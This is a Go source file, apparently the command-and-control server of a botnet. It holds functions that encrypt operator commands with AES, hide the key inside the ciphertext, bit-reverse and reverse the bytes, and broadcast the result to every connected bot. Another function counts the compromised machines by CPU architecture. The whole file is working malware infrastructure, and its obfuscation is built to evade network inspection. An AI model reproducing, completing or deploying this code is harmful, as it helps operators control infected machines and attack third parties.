package bot_server

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	random "math/rand"
	"time"
)

func SendCommand(_command string) {
	cmd := Encrypt([]byte(_command))
	if cmd == nil {
		return
	}

	var command []byte

	command = append(command, []byte{255, 255, 10, 29, 49, 19, 10, 12, 44, 202}...)
	command = append(command, cmd...)

	BotsList.Range(func(_, conn any) bool {

		conn.(*Bot).conn.Write([]byte(command))
		time.Sleep(100 * time.Millisecond)
		return true
	})
}

func genKey(length int) []byte {
	s1 := random.NewSource(time.Now().UnixNano())
	r1 := random.New(s1)
	const chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!@#$^&()-+"
	result := make([]byte, length)
	for i := 0; i < length; i++ {
		result[i] = chars[r1.Intn(len(chars))]
	}
	return result
}

func Encrypt(command []byte) []byte {

	key := genKey(32)

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}

	cipherText := make([]byte, aes.BlockSize+len(command))
	iv := cipherText[:aes.BlockSize]
	if _, err = io.ReadFull(rand.Reader, iv); err != nil {
		return nil
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(cipherText[aes.BlockSize:], command)

	_res := []byte(string(key[:16]) + string(cipherText) + string(key[16:]))

	for i := range []byte(_res) {
		_res[i] = reverseBytes(_res[i])
	}

	res := reverseArrayBytes(_res)
	return []byte(res)

}

func reverseBytes(bytes byte) (res byte) {
	for i := 0; i < 8; i++ {
		res <<= 1
		res |= bytes & 1
		bytes >>= 1
	}
	return res
}

func reverseArrayBytes(input []byte) []byte {
	var res = make([]byte, 0)

	for i := range input {
		x := input[len(input)-1-i]
		res = append(res, x)
	}

	return res
}

func GetBots() (int, string) {

	var res string

	resmap := make(map[string]int)

	BotsList.Range(func(_, b any) bool {
		resmap[b.(*Bot).i.Arch]++
		return true
	})

	for arch, count := range resmap {
		res += fmt.Sprintf("%s: %d\n\r", arch, count)
	}

	return BotCount, string(bytes.TrimSuffix([]byte(res), []byte{10, 13}))
}
